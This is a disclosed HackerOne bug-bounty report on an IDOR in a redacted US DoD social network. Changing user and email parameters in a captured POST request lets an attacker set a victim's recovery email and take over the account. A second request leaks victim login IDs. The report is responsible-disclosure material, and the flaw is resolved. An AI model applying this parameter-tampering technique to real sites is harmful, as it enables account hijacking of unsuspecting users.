---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/web
  - vuln/idor
  - impact/account-takeover
  - trigger/password-reset
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2020-05-14
submitted: 2020-04-11T16:43:50.478Z
bounty_usd: null
votes: 11
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "r00tpgp"
source: "https://hackerone.com/reports/847452"
title: "Full Account Take-Over of ████████ Members via IDOR"
---
# Full Account Take-Over of ████████ Members via IDOR

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 11 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-05-14

- Report: [https://hackerone.com/reports/847452](https://hackerone.com/reports/847452)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2020-04-11T16:43:50.478Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Summary
https://███████ is a Social Network Site belonging to US DoD. Membership is open to anyone, I have found a method to fully take-over any members' account by exploiting an IDOR bug in the `██████████` end-point. By changing the following values in the `POST` request to the affected end-point:

`userName`
`originalEmail`
`Email`
`RecoveryEmail`

I am able to add Recovery Email address of my choice, thus, enabling me to send a password reset link to my attacker controlled email address. I have uploaded a video PoC to demo my finding. Note that the following test accounts were used:

###Attacker
login: ████████

###Victim
login: ███████

I added `████` email into the victim account. Note that this only works on victims that have no recovery email address defined or recovery email that are not yet verified. This technique will NOT work on victims' that already have a confirmed recovery email address.

Also note, that I am using multi-containers plugin for Firefox, therefore, each tab represents separate browser session. Finally, note that in my PoC video, I had to insert the victim recovery email link `████████/self?guid=█████████` into the attackers' session because a valid session is required to validate the email. The session does not necessary have to belong to the victims' session to validate.

The IDOR bug can be obtained by intercepting the 2-FA Authentication switch:

███


## Vulnerable End-Point

Here is the vulnerable POST request when captured, the cookies and `__RequestVerificationToken` must be valid for this attack to work, I have ==highlighted== the vulnerable IDOR parameters:

POST /self HTTP/1.1
Host: █████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://███/self
Content-Type: application/x-www-form-urlencoded
Content-Length: 739
Connection: close
Cookie: ███████-Http-Session=███; _ga=█████; _gid=███; AWSALB=█████; AWSALBCORS=████; ASP.NET_SessionId=██████████; BIGipServer~Sync_Only~passport_pool=█████; akaalb_albcustom=█████████████def~id=██████████; AWSALB=███; AWSALBCORS=██████; googtrans=/en/en; googtrans=/en/en; UserName=███████████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-███; _gat_███Tracker=1; __RequestVerificationToken_Lw__=█████
Upgrade-Insecure-Requests: 1

__RequestVerificationToken=█████████&==userName=████&originalEmail=████████%40gmail.com&oldPassword=&EmailSent=False&RecoveryEmailSent=true&RecoveryEmailVerified=true&SecurityImagePath=&Translate=en&COIGroupID=&Username=█████████&Email=██████████%40gmail.com&ConfirmEmail=&RecoveryEmail=██████████&ConfirmRecoveryEmail=&NewPassword=&ConfirmPassword=&TwoFactorAuthenticationEnabled=false&Password=&Password=&Password=&Password=&Password===

## Impact

An attacker can add his email address into the recovery field of any █████████ member that has not yet defined or verified a Recovery Email address. He will then be able to force a password reset link to be sent to his email address and change the victims' password and login into victims' account. Attacker now has full control of victims' account.

Also, victim login id is easily retrievable from this end point. By running the `RequesteeId` using any valid user session, attacker is  able to retrieve the `ProfileUrl` containing the victims' login id.

##Request

POST /api.ashx/v2/users/████/friends.json HTTP/1.1
Host: █████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization-Code: █████████
Rest-Authorization-Code: █████████
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://████
Connection: close
Referer: https://████/members/███/
Cookie: _ga=███████; _gid=██████████; AWSALB=█████████; AWSALBCORS=█████; █████████-Http-Session=█████████; googtrans=/en/en; UserName=█████████,█████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-████; akaalb_albcommunity=██████████; AuthorizationCookie=███; BIGipServer~Sync_Only~community_pool=██████████

==RequesteeId=███████==&RequestMessage=+

##Reply:


{
"Friendship": {
"CreatedDate": "2020-04-11T08:22:53.247",
"FriendshipState": "Pending",
"LastModifiedDate": "2020-04-11T08:22:53.247",
"RequestMessage": " ",
"RequestorId": ██████,
=="RequesteeId": █████,==
"User": {
"AvatarUrl": "https://████████/cfs-file/__key/system/images/anonymous.gif",
"DisplayName": "█████",
=="ProfileUrl": "https://████/members/███████",==
"Username": "██████████",
"CurrentStatus": null,
"Id": █████████
},
"Id": ███
},
"Info": [],
"Warnings": [],
"Errors": []
}


Therefore, attacker just needs to feed the login id into the vulnerable end-point and follow the steps outlined in the PoC video to take over thousands of ██████████ user accounts!

## Timeline

- **Report Filed**
- **2020-04-11** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2020-04-11** @r00tpgp: Video embedded for easy viewing:

███
- **Report Title Updated**
- **2020-04-12** @r00tpgp: Hi, I would also like you to also consider #847185 as as valid bug. One of the end-point mentioned in that report was used  to  identify the victims login id  used to exploit the account takeover bug. I self closed it earlier was because I wasn't sure if it was a vulnerability but now that I had discovered this bug I feel it is a bug in its own right and can be used to harvest personal information for further damage.  Cheers.
- **Report Triaged**
- **Report Severity Updated**
- **2020-04-13** @r00tpgp: @agent-l8 Thanks for the quick response. I'm glad to be able to assist, have a great day ahead of you!
- **2020-04-13** @agent-l8: Thanks @r00tpgp we will let you know if we need anything further and update you as we are able. Appreciate it!
- **Report Resolved**
- **Agreed On Going Public**
- **2020-04-22** @agent-l8: @r00tpgp we do minor redaction's and disclose high/crit reports but are in the process of changing a few things in how it is done. That said- you can request disclosure and it will be added to the queue to be pushed out once we are able.
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
